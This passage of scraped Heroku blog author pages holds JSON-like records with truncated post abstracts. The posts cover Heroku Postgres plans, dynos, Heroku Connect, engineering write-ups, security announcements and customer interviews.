November 20, 2013 Matthew Soldo Editor's Note: We are cross-posting this article from the Salesforce Blog . It shows how we are bringing Heroku to a new market and audience - Salesforce customers - using a new product and message. If you are a user of both Heroku and Salesforce and are interested in connecting them, check out Heroku1 . Apps are an essential part of the Internet of Customers. They are the dashboards to people’s lives. They allow your customers to be part of your business’ workflows, and for you to engage with them on an unprecedented level. Customer connected apps are the next phase of how companies are innovating and gaining competitive advantage. Today, we are launching Heroku1, a complete service... Read more Tools for integrating Heroku apps with Salesforce.com news November 19, 2013 Matthew Soldo At our core, Heroku's goal is to make it easier for developers to build great apps. We do this by creating tools which allow developers to focus on writing code, rather than wasting time on managing infrastructure. To coincide with this week's Dreamforce event , we are launching several tools targeted at developers who write apps on Heroku that integrate with Salesforce.com. If you aren't part of the Salesforce world, don't worry. We remain 100% committed to our core audience of web and mobile developers and will continue to release great new features and functionality like websockets and high-availability databases . Force.com, a full stack platform for building... Read more 2X Dynos Enter General Availability news May 31, 2013 Matthew Soldo Thousands of Heroku customers have already updated their apps to utilize 2X dynos since they entered public beta on April 5. By providing twice the memory and CPU share, 2X dynos help to improve app performance and efficiency. 2X Dynos enter General Availability today. Starting tomorrow, June 1, 2013, 2X dynos will be billed at the full $0.10 per hour rate. Heroku customers have used 2X dynos to solve a number of problems: 1. Concurrency for Rails with Unicorn - Rails apps see significant performance improvements using Unicorn. In-dyno queuing allows requests to be served by any available worker. 2X dynos allow more workers per dyno, yielding better-than-linear performance... Read more Heroku Office Hours, Wed 10/17 at 3pm PDT news October 15, 2012 Matthew Soldo This Wednesday 10/17 from 3-5pm we will be holding office hours for customers and users in our San Francisco office. This is an opportunity for you to come meet us and ask questions about developing your apps on Heroku. It is an opportunity for us to learn more about you and your needs. Heroku engineers, product managers, and designers will be available to chat with you about your code, application, business, or whatever else you want. Maybe you're a new user, and have some getting started questions. Perhaps you've been using Heroku for ages and have a high level architectural question. Or maybe you just want to shake someone's hand from the Heroku Postgres team. Either way... Read more Announcing Support for 16 new Postgres Extensions news August 02, 2012 Matthew Soldo Databases are the well known solution for storing data for your application. However they sometimes lack functionality required by application developers such as data encryption or cross database reporting. As a result developers are forced to write the needed functionality at their application layer. Postgres 9.1, which already has an extensive collection of data types and functions, took the first step towards mitigating this by creating an extension system which allows the database’s functionality to be expanded. Today we are releasing support for 16 new Postgres extensions which add exciting new functionality including the ability to query from multiple database ( dblink ), a... Read more Release of new plans on August 1st news July 25, 2012 Matthew Soldo We are happy to announce that our new line-up of database plans are being released on August 1st. The dev , basic , crane , and kappa plans make many of the most exciting features of our fully-managed database service available to a wider audience. They are now ready for all users. We will also begin billing for these plans as of August 1st. If you have been beta testing one of these databases and do not wish to incur charges for it going forward, please remove it immediately via the web interface or the command line: heroku addons:remove HEROKU_POSTGRESQL_COLOR --app app_name If you have been waiting to use these plans because they have been in beta, then your wait is (almost) over. They... Read more Heroku Postgres Basic Plan and Row Limits news July 16, 2012 Matthew Soldo Today, the Heroku Postgres team released into beta the new basic plan , $9 / month version of the free dev plan . Accompanying this announcement is the implementation of a 10,000 row limit on the dev plan. This row limit was designed to correspond to the 5mb limit on the existing free shared plan. Please note that these plans are still beta, and Heroku Postgres has not yet announced a migration schedule from the shared plan. However you can start using these plans today. Read more about the new plan, and the mechanics of the row limits on the Heroku Postgres Blog . Read more Ten Million Rows for Under Ten Bucks news July 16, 2012 Matthew Soldo Six weeks ago we launched into beta the Heroku Postgres dev plan , a free, postgres 9.1 plan that offers many of the features of our production tier service. Over 3,000 of these dev databases are in active use, and it has been operating exceptionally well. When we launched the dev plan, we wrote that the plan would be limited based on rows rather than physical byte size. Today we are implementing a 10,000 row limit for the dev plan. This limit was chosen to correspond to the 5mb limit on the existing, shared database service. Over 98% of the active shared databases that are under 5mb are also under the 10,000 row limit. Introducing the Basic Plan If you need more than 10,000 rows, you... Read more Crane: Heroku's new $50 per month production database news May 08, 2012 Matthew Soldo Last week we launched our dev plan , a free database designed for development and testing. Today, we are launching into public beta two new plans: Crane and Kappa. These plans are part of our production tier, offering the same monitoring, operations, support, and data protection features as our more expensive plans. Crane is available for $50 per month and features a 400 mb cache. Kappa is $100 per month and features a 800 mb cache. They can be provisioned immediately via the Heroku Postgres website or via our command line tool: $ heroku addons:add heroku-postgresql:crane Use Cases Crane and Kappa make Heroku Postgres' fully managed database service available to a much wider... Read more Heroku's new, free PostgreSQL 9.1 development database news May 01, 2012 Matthew Soldo Introducing the newest plan in the Heroku Postgres line-up: dev . It is an updated replacement for the PostgreSQL 8.3-based shared database add-on. This plan is available immediately in public beta: $ heroku addons:add heroku-postgresql:dev It can also be provisioned through the Heroku add-ons catalog . What's New? This new dev plan offers increased parity between our free database service and our paid, production plans. New features include: Postgres 9.1 Data clips hstore Direct database access from psql or other libpq clients. Support for most pg commands in the Heroku command line client. Visibility through the web interface at postgres.heroku.com . Support for many databases... Read more Introducing key/value data storage in Heroku Postgres news March 14, 2012 Matthew Soldo One of the great strengths of PostgreSQL is extensibility. Just as the JVM has become more than a way to just run Java—spawning languages such as Clojure and Scala—PostgreSQL has become more than just a home to relational data and the SQL language. Our first officially supported Postgres extension, hstore , enables you to build better apps faster without sacrificing the power, reliability, and flexibility of the underlying PostgreSQL storage engine. By using hstore, you will be able to leverage the flexibility and agility of schema-less data stores in existing environments. Although hstore is a mature, stable solution, it has recently been gathering widespread excitement: The Durable... Read more Simple data sharing with Data Clips news February 14, 2012 Matthew Soldo Data clips are available today in beta as a standard feature on all Heroku Postgres databases. When we share information on the Internet, we do so by sharing URLs. We send URLs for locations , books , videos , and even source code . Until now there hasn't been a convenient way to share data inside a database. That's why we're introducing Data Clips. They are a fast and easy way to unlock the data in your database in the form of a secure URL . Data Clips allow the results of SQL queries on a Heroku Postgres database to be easily shared. Simply create a query on postgres.heroku.com , and then share the resulting URL with co-workers, colleagues, or the world. Data clips can be shared... Read more PostgreSQL 9.1 Available in Beta news January 18, 2012 Matthew Soldo One of the benefits of consuming a database through Heroku Postgres is that we are continually improving the service. This benefit is compounded by the fact that our service is based on PostgreSQL , a vibrant and active open source project. The release of PostgreSQL 9.1 had added a number of feature, performance and reliability improvements . These are available today with our beta support for PostgreSQL 9.1. We have been testing and watching PostgreSQL 9.1 since it became available in September. With the recent release of 9.1.2, it is now ready for prime time on Heroku. Test out PG 9.1 right now with: $ heroku addons:add heroku-postgresql version=9.1 PostgreSQL 9.1 can also be selected... Read more Announcing Heroku Postgres news November 22, 2011 Matthew Soldo Until now, Heroku's Postgres database service - originally launched in 2007 - has only been available to Heroku customers for use with Heroku platform apps. Today we're excited to announce the launch of Heroku Postgres as a standalone service. With measured service uptime of four nines (99.99%), and designed data durability of eleven nines (99.999999999%), the service is trustworthy for mission-critical data. As of today, these production-quality Heroku Postgres databases are independently available for use from any cloud platform, provisioned instantly, metered by the second, and without contract. Battle Tested Heroku Postgres has successfully and safely written 19 billion... Read more PostgreSQL 9 Public Beta news December 17, 2010 Matthew Soldo At Heroku, we believe PostgreSQL offers the best mix of powerful features, data integrity, speed, standards compliance, and open-source code of any SQL database on the planet. That’s why we were so excited to see the new release of PostgreSQL, version 9.0.1. The release is described as “the most anticipated PostgreSQL version in five years” for good reason. The release adds over 200 new features and improvements . For more on PostgreSQL 9, see the coverage in Computerworld , Infoworld , and Linux.com as well as the discussion on Hacker News . Today we are making PostgreSQL 9 available to all Heroku users through our public beta program. It is offered as a dedicated database... Read more Bundles Deprecation news November 30, 2010 Matthew Soldo Recently we announced the release of PG Backups , our new database backup service. Since then, PG Backups has seen rapid adoption and has been successfully managing the backups of a large and growing number of our production customers. Today we are announcing the deprecation of Bundles. Although Bundles has served the Heroku community well, we have found that it doesn’t scale to adequately meet the needs of the larger, more complex applications running on Heroku today. We encourage all of our users to migrate their application backup strategy to PG Backups as soon as possible. Starting today (November 30, 2010) we will no longer allow the Bundles add-on to be added to applications.... Read more Announcing PG Backups news November 15, 2010 Matthew Soldo Heroku is launching a new database backup solution. Heroku PG Backups is available immediately and is the officially supported and recommended method of backing up your PostgreSQL database on Heroku. PG Backups is a significant architectural improvement over Bundles and is designed to handle the large-scale, production databases that are being deployed to Heroku today. In addition to these backend improvements, PG Backups offers several new features: Backups are captured using pg_dump’s -Fc compressed format. This is the most reliable, fastest way of capturing backups from PostgreSQL. Data can be easily imported to your application – the pgbackups:restore command can restore... Read more Announcing Heroku PostgreSQL Database Add-on news November 10, 2010 Matthew Soldo Today Heroku is releasing an update to our dedicated database service. Heroku PostgreSQL provides an improved upgrade path for our users as their applications grow by offering new features, new plans, and instant provisioning. Product Improvements Direct database connectivity through psql (the Postgres command-line tool) or libpq (the Postgres client library). Direct connectivity makes it easier to introspect the database directly and run ad-hoc queries. It also enables complex, multi-application architectures with shared data stores. Instant provisioning and customer driven migrations . Previously, upgrading to our dedicated databases was a semi-manual procedure which required... Read more", "date": "2014-08-12,"},
{"website": "Heroku", "title": null, "author": ["Matthew Creager", "Matthew Creager", "Matthew Creager", "Matthew Creager", "Matthew Creager", "Matthew Creager", "Matthew Creager", "Matthew Creager"], "link": "https://blog.heroku.com/authors/matthew-creager", "abstract": "Cyber Monday, No Sweat: Why Sweet Tooth Chose PaaS news April 07, 2016 Matthew Creager We recently sat down for a chat with Bill Curtis , a co-founder and the CTO of Sweet Tooth , a points and rewards app for online stores worldwide. What has been your greatest challenge? We’re serving way more data today than we ever have, so scaling is mission-critical. In the past, we’ve struggled with traffic spikes. For example, there are seasonal spikes, like Black Friday or Cyber Monday. There are also spikes from merchant activity, such as load testing stores or importing a large number of orders. I recently tweeted our requests-per-hour graph. It showed that during the huge spikes for this year’s Black Friday and Cyber Monday, our product availability was seamless on Heroku. That... Read more Talking with Tom Dale about Ember FastBoot and the Return of Scrappy JavaScript news April 05, 2016 Matthew Creager Last week, Terence Lee and I caught up with Tom Dale at EmberConf to talk about FastBoot, when you should avoid native apps, and why JavaScript on the server and the browser might start to converge. Check the end for the full recording! So let's start with the drama, would you say Ember has declared war on native apps? [laughs] [sigh] Yeah. Yeah, I think that's fair. Yeah. Sure. Why not? Let's go with that. A lot of other frameworks, take this approach of bringing web technologies and dropping them into native experiences - React Native being the prime example. It seems that Ember wants to bring back the glory days for web technologies - is that right? Yeah, absolutely. I... Read more React, Ruby and CI: An Interview with Matthew Eckstein news March 22, 2016 Matthew Creager Matthew Eckstein is the VP of Engineering for charity: water. For more information, visit: www.charitywater.org . Read our charity: water customer story to learn more about how Heroku has helped their organization deliver clean water to millions of people around the world. Tell us a bit about charity: water charity: water is a non-profit organization that brings clean and safe drinking water to people in developing nations all around the world. We rebuilt our online fundraising and donation platform on Heroku and are super excited to share our story today, March 22nd on World Water Day . When we first moved to Heroku, we decided to rebuild our system from the ground up. The engineering... Read more How to Deploy Your Slack Bots to Heroku news March 08, 2016 Matthew Creager Whether they're publishing notifications, responding to /slash commands or carrying a conversation, bots have become an integral part of the way we work with Slack. A bot can do any number of things for your team as part of your day-to-day work, you're only limited by your imagination. For some first-hand experience, check out the Heroku Button Gallery , where users have created all types of bots: from fun bots like poker and Jeopardy! , to more practical ones like a bot that tracks the satisfaction of your team members or one that reminds your team to review existing pull requests . That said, the real power and fun of Slack bots comes once you know how to build your own. In this... Read more Building a P2P Marketplace on Heroku: An Interview with Vitali Margolin news February 16, 2016 Matthew Creager Based in Tel Aviv, Israel, Vitali Margolin is the Head of R&D for Roomer. Vitali leads a team of seven developers who built and operate the travel marketplace www.roomertravel.com and the travel protection service www.life-happens.com , both running on Heroku. What are you running on Heroku? The four big projects are: the Roomer website, our administration app, our partner network and B2B website, and the Roomer API. The Roomer API is our highest load app. It can get up to 10k requests per minute from partner integrations such as Kayak. We have a few more technical products, including an app that does text recognition and automatically decodes confirmation emails, as well as a smart... Read more How Lean Poker Teaches Continuous Deployment on Heroku: An Interview with Creator Rafael Ördög news February 02, 2016 Matthew Creager In 2013, Rafael Ördög put poker and code together, the result: Lean Poker , a competitive coding event that teaches continuous deployment and lean startup methodologies. Rafael is based in Budapest, Hungary. What's Lean Poker? Lean Poker is a coding workshop that is designed to teach people how to practice continuous deployment and lean startup methodologies. Companies can sponsor a free public event or hold an internal, team-building event for their own employees. The basic starting code is really simple and teams can use the language of their choice. The challenge is not to understand an existing code base but to modify it—to build a new app. Teams must iterate their app quickly in... Read more Announcing Heroku + Parse: Flexible Platform Meets Feature-Rich SDKs news October 22, 2015 Matthew Creager Most modern mobile apps depend heavily on the app’s back-end. That’s because many of the expectations users have for mobile apps today -- for the application to work regardless of network connectivity, to notify them when relevant content changes, to have integrations with the social networks they use, for appropriate levels of security, and a hundred other things -- are reliant on the app’s back-end services. The most common pattern for mobile back-ends we see today is for developers to design, build and maintain their back-end architectures on Heroku. This approach is as flexible as it is powerful, but it requires significant engineering effort. A faster alternative would be to use a... Read more Announcing A Very Ruby Thanksgiving news November 10, 2014 Matthew Creager We’re very excited that our Heroku colleagues Matz, Nobu and Ko1 will all be visiting from Japan soon to attend RubyConf, and it’s especially serendipitous that it is happening in such close proximity to Thanksgiving. Not only is Thanksgiving one of the few holidays that Japan and the U.S. share, it’s a holiday that brings families together to reflect on what’s been accomplished, and to share insight into the future. We've been waiting for just the right opportunity to organize a small Ruby gathering and Thanksgiving provides the perfect setting. \"I hope to see Ruby help every programmer in the world to be productive, to enjoy programming, and to be happy. That is the primary... Read more", "date": "2016-04-07,"},
{"website": "Heroku", "title": " ", "author": ["Email", "Twitter", "GitHub", "Mars Hall", "Mars Hall", "Mars Hall"], "link": "https://blog.heroku.com/authors/mars-hall", "abstract": "Reactive Programming with Salesforce Data engineering February 28, 2019 Mars Hall The recent introduction of Platform Events and Change Data Capture (CDC) in Salesforce has launched us into a new age of integration capabilities. Today, it's possible to develop custom apps that respond to activity in Salesforce. Whether you're creating a memorable customer interaction or implementing an internal workflow for employees, consider an event-sourced design to improve responsiveness and durability of the app. In this article, we'll look at an event-sourced app architecture that consumes the Salesforce Streaming API using the elegant jsforce JavaScript library in a Node app on Heroku . Streaming with jsforce In summer 2018, the open-source jsforce library ... Read more Introducing the Einstein Vision Add-on for Image Recognition news March 07, 2017 Mars Hall The most innovative apps augment our human senses, intuition, and logic with machine learning. Deep learning , modelled after the neural networks of the human brain, continues to grow as one of the most powerful types of machine learning. When applied to images, deep learning enables powerful computer vision features like visual search, product identification, and brand detection. Today, we bring you the Einstein Vision add-on (beta) , allowing Heroku developers to easily connect to and use Einstein Vision , a set of powerful new APIs for building AI-powered apps. With this release, Salesforce is making it easy for you to embed image recognition directly into your apps. Rather than building... Read more Deploying React with Zero Configuration news August 16, 2016 Mars Hall So you want to build an app with React ? \"Getting started\" is easy… and then what? React is a library for building user interfaces, which comprise only one part of an app. Deciding on all the other parts — styles, routers, npm modules, ES6 code, bundling and more — and then figuring out how to use them is a drain on developers. This has become known as javascript fatigue . Despite this complexity, usage of React continues to grow. The community answers this challenge by sharing boilerplates . These boilerplates reveal the profusion of architectural choices developers must make. That official \"Getting Started\" seems so far away from the reality of an operational app. Read more", "date": "2019-02-28,"},
{"website": "Heroku", "title": null, "author": ["Mark Pundsack", "Mark Pundsack", "Mark Pundsack", "Mark Pundsack"], "link": "https://blog.heroku.com/authors/mark-pundsack", "abstract": "App Sleeping on Heroku news June 20, 2013 Mark Pundsack When talking to Heroku users, a question that frequently comes up is \"when do my apps go to sleep, and why?\". Though the behavior is documented in Dev Center , we'd like to provide more immediate visibility into the state of your apps at any given moment. When Do Apps Sleep? When an app on Heroku has only one web dyno and that dyno doesn't receive any traffic in 1 hour, the dyno goes to sleep. When someone accesses the app, the dyno manager will automatically wake up the web dyno to run the web process type. This causes a short delay for this first request, but subsequent requests will perform normally. Apps that have more than 1 web dyno running never go to sleep and... Read more Design of the Status Site news August 06, 2012 Mark Pundsack A couple months ago, we launched a completely redesigned Heroku status site . Since design is important to us and, we think, to many of you, we're taking a break from our usual blog posts to dig into the Heroku approach to visual product design. Read on to experience the twists and turns on the way to the final design and let us know in the comments if you want to see more posts like this. The Premise For platform providers, a status site is a way to build trust with your customers, and in some cases, future customers. Heroku is no different. Our existing status site hadn't been updated in over two years and was showing its age. We took this as an opportunity to go back to... Read more New Heroku Status Site news May 22, 2012 Mark Pundsack Developers like you deploy code to hundreds of thousands of apps every month on the Heroku platform. Some of these are production apps which serve hundreds of millions or even billions of requests per month. Uptime of the platform is critical for such apps. We want to achieve the sustained reliability that these apps require. But when there are incidents that impact uptime, we want to maximize our transparency and accountability to you and all developers on the platform. Today, we’re launching a completely redesigned status.heroku.com , which provides real-time status of the platform, the ability to sign up for email or SMS notification of incidents, and recent uptime history in both... Read more Heroku Scheduler Add-on Now Available news November 11, 2011 Mark Pundsack Today we're happy to announce the availability of Heroku Scheduler . Scheduler is an add-on for running administrative or maintenance tasks, or jobs, at scheduled time intervals. It's the polyglot replacement of the Cron add-on, with more power and flexibility. And it's free; you just pay for the dyno time consumed by the one-off tasks . A dashboard allows you to configure jobs to run every 10 minutes, every hour, or every day, and unlike the Cron add-on, you can control when. E.g. Every hour on the half-hour, or every day at 7:00am. Polyglot Tasks Tasks are any command that can be run in your application or even the Unix shell. For Rails, the convention is to set up rake ... Read more", "date": "2013-06-20,"},
{"website": "Heroku", "title": null, "author": ["Mark McGranaghan", "Mark McGranaghan", "Mark McGranaghan", "Mark McGranaghan"], "link": "https://blog.heroku.com/authors/mark-mcgranaghan", "abstract": "The Heroku HTTP API Toolchain news May 20, 2014 Mark McGranaghan Today we’re open sourcing the toolchain Heroku uses to design, document, and consume our HTTP APIs. We hope this shows how Heroku thinks about APIs and gives you new tools to create your own. This toolchain includes: An HTTP API design guide , describing how we structure both internal and public-facing APIs and document them using the JSON Schema standard. A tool for working with JSON schemas and using them to generate API documentation. Ruby and Go client code generators for APIs with JSON schemas. Here’s some more information about these things, how we use them at Heroku, and an explanation of how you can try them yourself. JSON Schema Foundation We’ve developed the toolchain around... Read more Incident Response at Heroku news May 09, 2014 Mark McGranaghan As a service provider, when things go wrong you try to get them fixed as quickly as possible. In addition to technical troubleshooting, there’s a lot of coordination and communication that needs to happen in resolving issues with systems like Heroku’s. At Heroku we’ve codified our practices around these aspects into an incident response framework. Whether you’re just interested in how incident response works at Heroku, or looking to adopt and apply some of these practices for yourself, we hope you find this inside look helpful. Incident Response and the Incident Commander Role We describe Heroku’s incident response framework below. It’s based on the Incident Command System used in... Read more Rails Security Vulnerability news January 10, 2013 Mark McGranaghan A serious security vulnerability has been found in the Ruby on Rails framework. This exploit affects nearly all applications running Rails and a patch has been made available. Rails developers can get a full list of all your affected Heroku applications by following instructions here . Please address this security vulnerability by immediately upgrading your affected apps to any of the safe versions of Rails listed below. The following Rails versions have been patched and deemed safe from this exploit: 3.2.11 3.1.10 3.0.19 2.3.15 If you do not upgrade, an attacker can trivially gain access to your application, its data, and run arbitrary code or commands. Heroku recommends upgrading to a... Read more Tuesday Postmortem news October 27, 2010 Mark McGranaghan Tuesday was not a good day for Heroku and as a result it was not a good day for our customers. I want to take the time to explain what happened, how we addressed the problem, and what we’re doing in the future to keep it from happening again. Over the past few weeks we have seen unprecedented growth in the rate of new applications being added to the platform. This growth has exacerbated a problem with our internal messaging systems that we’ve known about and been working to address. Unfortunately, the projects that we have underway to address the problem were planned based on previous growth rates and are not yet complete. A slowdown in our internal messaging systems caused a... Read more", "date": "2014-05-20,"},
{"website": "Heroku", "title": null, "author": ["Email", "Twitter", "LinkedIn", "Margaret Francis", "Margaret Francis", "Margaret Francis", "Margaret Francis", "Margaret Francis", "Margaret Francis", "Margaret Francis", "Margaret Francis"], "link": "https://blog.heroku.com/authors/margaret-francis", "abstract": "Pride Runs Deep life July 01, 2019 Margaret Francis Pride is a word with many meanings. It can mean a job well done. It can mean satisfaction in who you are or what you stand for. For me, it is all of that and more. It is one of the values that runs deeply at Heroku and what keeps me here -- pride in the work we do, pride in how we do it, and most importantly, pride in our people. One of the most moving things I have seen this past month is this Heroku Pride wallpaper on peoples’ screens all around the office. At this 50th anniversary of the Stonewall riots, and the conclusion of Pride month, on the day after the Pride parade here in San Francisco and in so many other places far and near, big and small, we asked for reflections from our... Read more Heroku Connect APIs Now GA news May 10, 2016 Margaret Francis Today we’re announcing that the APIs for the Heroku Connect data synchronization service are now GA. These fully supported endpoints will help our users with the tasks they most need repeatable automation for: creating consistent configuration across development, staging, and production environments; managing connections across multiple Salesforce deployments; and integrating Heroku Connect status with their existing operational systems and alerts. When we first released Heroku Connect, users were delighted with the simple point and click UI: they could suddenly integrate Salesforce data with Heroku Postgres in one enjoyable minute! But as users’ familiarity with the service has grown... Read more Customer Centered E-Commerce: Salesforce + Heroku news September 09, 2015 Margaret Francis Today we are releasing a reference architecture and sample app for running e-commerce apps on Heroku, with a simple pattern for integrating customer, order and product data with Salesforce via Heroku Connect. The documentation and open source repo can be found on GitHub. The key: Any transaction recorded in Heroku Postgres can be seamlessly integrated with Salesforce via Heroku Connect . Salesforce for E-Commerce Many Salesforce customers are looking to extend their Salesforce deployments with e-commerce on Heroku. Whether running a single storefront, launching new concepts and brands, or innovating to improve core retail functions, these e-commerce experiences require orchestration... Read more Heroku Connect Demo Edition Now Available via Heroku Button news February 24, 2015 Margaret Francis Nine months ago we released Heroku Connect, the bi-directional data synchronization service that enables developers to build Heroku apps that seamlessly interact with Salesforce data. Since then, we’ve seen developers use it to build all types of interesting apps for web and mobile, especially for eCommerce, loyalty, and Internet of Things use cases. We’ve also seen an avalanche of requests from every corner of the Salesforce ecosystem for a simple and free way to try Heroku Connect, and explore new use cases. Today we are announcing the availability of Heroku Connect Demo Edition, a free version of Heroku Connect designed for learning and experimentation but not production. With Demo... Read more Heroku External Objects: Bringing Native Postgres to Salesforce news November 13, 2014 Margaret Francis Today we are announcing a new data solution for combined users of the Heroku and Salesforce platform: Heroku External Objects. The newest feature of Heroku Connect, Heroku External Objects makes data from any Heroku Postgres database - like that from customer apps, transaction systems, or data warehouses- seamlessly available within a given Salesforce deployment. Leveraging the newly announced Salesforce1 Lightning Connect , Heroku External Objects gives Force.com developers a powerful new capability to help architect their Salesforce deployments and implement data services. Heroku Postgres + Force.com Every Force.com developer is familiar with the powerful database services the platform... Read more Introducing Heroku CX Patterns: Building Customer Experiences on Heroku with Salesforce Services news October 13, 2014 Margaret Francis A quick glance at most any phone shows the importance and urgency – for businesses of all kinds – of creating mobile customer apps. Our everyday activities – finding a ride , ordering a meal or turning on a light are increasingly mobile experiences. But delivering a great omnichannel experience to customers requires more than just the work of the application developer. The larger organization is involved in following up with prospects, fielding service inquiries, and sending relevant marketing messages. Orchestrating this tapestry of touchpoints often requires developers to integrate with systems used by non-developers, including sales, service, marketing and community management systems.... Read more Heroku Connect: Faster Synchronization and New Event Driven Architecture news July 30, 2014 Margaret Francis In May we released the first version of Heroku Connect, a service that makes it easy to build Heroku apps that share data with your Salesforce deployment. Today we released our first major update to the service, bringing new speed and scale enhancements to all Heroku Connect users. Together, these enhancements lower latency on Heroku Connect synchronization, provide developers with more granular controls and improve insight into their Force.com API utilization. Event Driven Synchronization from Force.com to Heroku Postgres One of the top requests from the first Heroku Connect customers was to reduce the latency of synchronization between Force.com and Heroku Postgres. With this... Read more Introducing Heroku Connect: Connecting Clouds and Customers news May 13, 2014 Margaret Francis Today we are announcing the general availability of Salesforce1 Heroku Connect. This new Heroku product is a synchronization service, conceptually similar to Dropbox or iCloud, that synchronizes data between a Salesforce deployment and a Heroku Postgres database. By bringing together the data layers of the Force.com and Heroku platforms--and thus allowing the same data to be seamlessly reflected in each cloud’s native database--you can use the capabilities of each platform together in a single application, without having to translate or otherwise integrate between them. Heroku + Force.com Heroku and Force.com are cloud platform ‘cousins’, each with its own semantics and high-level... Read more", "date": "2019-07-01,"},
{"website": "Heroku", "title": null, "author": ["Email", "Twitter", "GitHub", "LinkedIn", "Marc Sibson"], "link": "https://blog.heroku.com/authors/marc-sibson", "abstract": "Hello RedBeat: A Celery Beat Scheduler engineering May 02, 2017 Marc Sibson The Heroku Connect team ran into problems with existing task scheduling libraries. Because of that, we wrote RedBeat , a Celery Beat scheduler that stores scheduled tasks and runtime metadata in Redis. We’ve also open sourced it so others can use it. Here is the story of why and how we created RedBeat. Background Heroku Connect , makes heavy use of Celery to synchronize data between Salesforce and Heroku Postgres . Over time, our usage has grown, and we came to rely more and more heavily on the Beat scheduler to trigger frequent periodic tasks. For a while, everything was running smoothly, but as we grew cracks started to appear. Beat , the default Celery scheduler, began to behave... Read more", "date": "2017-05-02,"},
{"website": "Heroku", "title": null, "author": ["conference", "talks", "open", "source", "projects", "GitHub", "Lex Neva"], "link": "https://blog.heroku.com/authors/lex-neva", "abstract": "Sockets in a Bind engineering March 30, 2017 Lex Neva Back on August 11, 2016, Heroku experienced increased routing latency in the EU region of the common runtime. While the official follow-up report describes what happened and what we've done to avoid this in the future, we found the root cause to be puzzling enough to require a deep dive into Linux networking. The following is a write-up by SRE member Lex Neva ( what's SRE? ) and routing engineer Fred Hebert (now Heroku alumni) of an interesting Linux networking \"gotcha\" they discovered while working on incident 930. The Incident Our monitoring systems paged us about a rise in latency levels across the board in the EU region of the Common Runtime. We quickly saw that the... Read more", "date": "2017-03-30,"},
{"website": "Heroku", "title": null, "author": ["Email", "Twitter", "GitHub", "LinkedIn", "Lenora Porter"], "link": "https://blog.heroku.com/authors/lenora-porter", "abstract": "Chrome's Changes Could Break Your App: Prepare for SameSite Cookie Updates engineering February 03, 2020 Lenora Porter In this post, we will cover changes coming to Chrome (and other browsers) that affect how third-party cookies are handled—specifically SameSite changes, how to test to see if your site is impacted and how to fix it. What is SameSite and why the big change? Prepare for Chrome 80 updates Step 1: Enabling SameSite Chrome flags and test to see if your site faces SameSite errors Step 2: Fixing cookie errors using appropriate attributes What is SameSite and why the big change? Back in May 2019, Chrome announced its plan to develop a secure-by-default model for handling cookies. This initiative highlights Chrome’s promise of a more secure and faster browsing experience. Chrome's... Read more", "date": "2020-02-03,"},
{"website": "Heroku", "title": null, "author": ["Leigh Honeywell", "Leigh Honeywell"], "link": "https://blog.heroku.com/authors/leigh-honeywell", "abstract": "Beyond Heartbleed: Improved Security for Encrypted Connections news April 25, 2014 Leigh Honeywell The announcement earlier this month of the “Heartbleed” bug ( CVE-2014-0160 ) in OpenSSL once again focused attention on the technology used to secure communications on the Internet. Heartbleed was a very serious vulnerability and we moved as quickly as possible to patch systems and eliminate this threat on behalf of our customers. But security is not just about fire drills, there are many steps that can be taken over time to continually improve security. Over the last months we have rolled out several security improvements to Heroku SSL Endpoints , including: Perfect Forward Secrecy TLS 1.1 , 1.2 support Updated ciphers These enhancements have already been rolled out and are in effect for... Read more Heroku Security Bug Bounty news April 17, 2014 Leigh Honeywell The information in this blog post is out of date . For the latest information about Heroku's bug-bounty program and reporting process, please see our Security Policy page . Security researchers, you can always consult Heroku's security.txt for the latest policy information. Working with security researchers to ensure the trustworthiness of Heroku’s platform is an ongoing effort of ours. As part of this effort, the Heroku security team, in conjunction with Bugcrowd , is pleased to announce our new security bug bounty program. For each security bug you help find, which helps to ensure our platform is safe and secure, we'll reward you. Our initial rewards will be between $100 and... Read more", "date": "2014-04-25,"},
{"website": "Heroku", "title": null, "author": ["Email", "LinkedIn", "Lee Rong"], "link": "https://blog.heroku.com/authors/lee-rong-sun", "abstract": "Improving the Lives of People with Diabetes life November 15, 2019 Lee Rong Today, many people with diabetes are choosing to manage their condition using devices called continuous glucose monitors (CGMs). Not only do they replace the need for most finger prick testing, but they also provide a stream of data round the clock. However, like all data, it’s only as useful as the tools that analyze it. That’s where Sugarmate comes in. Created by serial entrepreneur Josh Juster to help manage his own condition, Sugarmate combines a Heroku back-end with web, mobile, and smartspeaker apps to provide life-changing alerts and analysis for people living with diabetes. Alexa, what’s my blood sugar level? For 26 years, Josh has himself been living with type 1 diabetes, and... Read more", "date": "2019-11-15,"},
{"website": "Heroku", "title": null, "author": ["Koichi Sasada"], "link": "https://blog.heroku.com/authors/koichi-sasada", "abstract": "Incremental Garbage Collection in Ruby 2.2 engineering February 03, 2015 Koichi Sasada This article introduces incremental garbage collection (GC) which has been introduced in Ruby 2.2. We call this algorithm RincGC. RincGC achieves short GC pause times compared to Ruby 2.1. Read more", "date": "2015-02-03,"},
{"website": "Heroku", "title": null, "author": ["Email", "Twitter", "Facebook", "LinkedIn", "Jennifer Hooper", "Sally Vedros", "Raul Murciano", "Charlie Gleason", "Kimberly Lowe-Williams", "David Routen", "Caleb Hearth", "Christie Fidura"], "link": "https://blog.heroku.com/authors/kim", "abstract": "Black Lives Matter: Our Thoughts, Actions, and Resources life June 29, 2020 Jennifer Hooper , Sally Vedros , Raul Murciano , Charlie Gleason , Kimberly Lowe-Williams , David Routen , Caleb Hearth and Christie Fidura It is never easy to know how to react, communicate, or at times, even feel, during something as heartbreaking and real as the struggles that our fellow humans face through no fault of their own. As Herokai, we stand in solidarity with the Black Lives Matter movement and want to share some of our thoughts on the struggle, as well as some actions and resources that we find helpful. We will be keeping this post updated and would love to include your voice. Please send us any thoughts that you’d like to share at: feedback@heroku.com . “Many, if not all, of us are watching the civil rights movement taking place around the world. We are hurting, we are angry, and many of us are asking, “How... Read more", "date": "2020-06-29,"},
